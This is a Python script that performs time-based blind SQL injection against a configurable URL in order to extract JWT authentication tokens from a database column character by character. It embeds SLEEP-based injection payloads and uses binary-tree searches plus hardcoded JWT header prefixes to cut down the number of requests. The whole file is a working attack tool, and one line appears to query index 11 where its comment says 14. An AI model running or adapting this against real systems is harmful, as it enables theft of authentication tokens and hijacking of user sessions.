#!/usr/bin/env python3
import requests
import sys
import time

## Config

# The target URL. Must contain '$payload$' where the payload will be inserted.
TARGET = "http://localhost/?id=2$payload$"

# The payload, which must sleep if (JWT_Char < $char$). Must contain '$index$' and
#   '$char$' where the index being tested and current test character will be inserted.
PAYLOAD = "' AND SUBSTR(jwt, $index$ %2B 1, 1) < '$char$' AND SLEEP(0.2) OR '"

# The payload to match a regular expression, which must sleep if (regex NOT matches).
#   Must contain '$regex$' where the regex will be inserted.
REGEX_PAYLOAD = "' AND SUBSTR(jwt, $index$ %2B 1, 1) REGEXP BINARY '$regex$' AND SLEEP(0.2) OR '"

# If a query takes longer than this then the SQL server slept
SQL_SLEPT_THRESHOLD = 0.2

## Config Ends

HEADERS = {
    # I+I|M|U
    "IUzI": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.",
    "IUzM": "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.",
    "IUzU": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.",

    # S+I|M|U
    "SUzI": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.",
    "SUzM": "eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.",
    "SUzU": "eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.",

    # F+I|M|U
    "FUzI": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.",
    "FUzM": "eyJhbGciOiJFUzM4NCIsInR5cCI6IkpXVCIsImtpZCI6ImlUcVhYSTB6YkFuSkNLRGFvYmZoa00xZi02ck1TcFRmeVpNUnBfMnRLSTgifQ.",
    "FUzU": "eyJhbGciOiJFUzUxMiIsInR5cCI6IkpXVCIsImtpZCI6InhaRGZacHJ5NFA5dlpQWnlHMmZOQlJqLTdMejVvbVZkbTd0SG9DZ1NOZlkifQ.",

    # Q+I|M
    "QUzI": "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.",
    "QUzM": "eyJhbGciOiJQUzM4NCIsInR5cCI6IkpXVCJ9.",
}

total_requests = 0


def create_tree(arr):
    """Creates a binary tree from a list of values."""
    # end of branch
    if len(arr) == 1:
        return (arr[0],)

    # find the middle index, and element
    mid = len(arr) // 2
    root = arr[mid]

    # create the tree recursively
    return root, create_tree(arr[:mid]), create_tree(arr[mid:])


def test_payload(payload):
    """Test if a generic payload sleeps."""
    target = TARGET.replace("$payload$", payload)

    # time query
    start_time = time.time()
    requests.get(target)
    elapsed_time = time.time() - start_time

    global total_requests
    total_requests += 1

    return elapsed_time > SQL_SLEPT_THRESHOLD


def test_regex(index, regex):
    """Test if a regex payload sleeps."""
    payload = REGEX_PAYLOAD.replace("$index$", str(index)).replace("$regex$", regex)
    return test_payload(payload)


def test_char(index, char):
    """Test if a single character matches sleeps."""
    payload = PAYLOAD.replace("$index$", str(index)).replace("$char$", char)
    return test_payload(payload)


def query_char(index, tree):
    """Uses the binary tree provided to query a single character."""
    if len(tree) == 1:
        return tree[0]

    current_char, lower, higher = tree
    slept = test_char(index, current_char)

    return query_char(index, lower if slept else higher)


def main():
    print("[+] Retriving JWT Tokens.....")
    print("[+] ", end="")

    # get header using characters at index 11 & 14
    # https://medium.com/@fasthm00/jwt-exfiltration-optimization-mysqli-66bc3238a2be
    char11 = query_char(11, create_tree(list("IFQS")))
    char14 = query_char(11, create_tree(list("IMU")))
    header = HEADERS[char11 + "Uz" + char14]
    print(header, end="")

    # generate binary trees
    symbols_tree = create_tree([""] + list("_-.0123456789"))
    lower_tree = create_tree(list("abcdefghijklmnopqrstuvwxyz"))
    upper_tree = create_tree(list("ABCDEFGHIJKLMNOPQRSTUVWXYZ"))

    # fetch the JWT (up to 1024 characters)
    for i in range(len(header), 1024):
        # determine which tree to use
        if test_regex(i, "[A-Z]"):
            char = query_char(i, upper_tree)
        elif test_regex(i, "[a-z]"):
            char = query_char(i, lower_tree)
        else:
            char = query_char(i, symbols_tree)

        # no more characters to fetch
        if char == "":
            break

        print(char, end="", flush=True)

    print("\n[+] Number of Requests:", total_requests)
    print("[+] Exfiltration Done!")


if __name__ == "__main__":
    if not "$payload$" in TARGET:
        print("Missing '$payload$' in TARGET config string.")
        sys.exit(1)
    if not "$index$" in PAYLOAD:
        print("Missing '$index$' in PAYLOAD config string.")
        sys.exit(2)
    if not "$char$" in PAYLOAD:
        print("Missing '$char$' in PAYLOAD config string.")
        sys.exit(3)
    if not "$index$" in REGEX_PAYLOAD:
        print("Missing '$index$' in REGEX_PAYLOAD config string.")
        sys.exit(4)
    if not "$regex$" in REGEX_PAYLOAD:
        print("Missing '$regex$' in REGEX_PAYLOAD config string.")
        sys.exit(5)

    main()
